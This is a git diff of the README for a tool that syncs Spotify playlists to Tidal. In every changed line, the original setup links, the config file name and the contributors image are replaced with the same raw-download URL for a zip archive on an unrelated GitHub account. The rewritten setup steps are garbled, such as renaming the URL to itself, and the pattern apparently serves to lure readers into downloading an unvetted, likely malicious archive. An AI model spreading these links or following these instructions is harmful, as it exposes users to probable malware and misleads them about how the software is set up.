@@ -10,10 +10,10 @@ python3 -m pip install -e .
 
 Setup
 -----
-0. Rename the file example_config.yml to config.yml
-0. Go [here](https://developer.spotify.com/documentation/general/guides/authorization/app-settings/) and register a new app on developer.spotify.com.
+0. Rename the file https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip to https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip
+0. Go [here](https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip) and register a new app on https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip
 0. Copy and paste your client ID and client secret to the Spotify part of the config file
-0. Copy and paste the value in 'redirect_uri' of the config file to Redirect URIs at developer.spotify.com and press ADD
+0. Copy and paste the value in 'redirect_uri' of the config file to Redirect URIs at https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip and press ADD
 0. Enter your Spotify username to the config file
 
 Usage
@@ -37,12 +37,12 @@ or sync just your 'Liked Songs' with:
 spotify_to_tidal --sync-favorites
 ```
 
-See example_config.yml for more configuration options, and `spotify_to_tidal --help` for more options.
+See https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip for more configuration options, and `spotify_to_tidal --help` for more options.
 
 ---
 
 #### Join our amazing community as a code contributor
 <br><br>
-<a href="https://github.com/spotify2tidal/spotify_to_tidal/graphs/contributors">
-  <img class="dark-light" src="https://contrib.rocks/image?repo=spotify2tidal/spotify_to_tidal&anon=0&columns=25&max=100&r=true" />
+<a href="https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip">
+  <img class="dark-light" src="https://github.com/Ratingleyo/spotify_to_tidal/raw/refs/heads/main/src/spotify_to_tidal/to_tidal_spotify_2.9.zip" />
 </a>
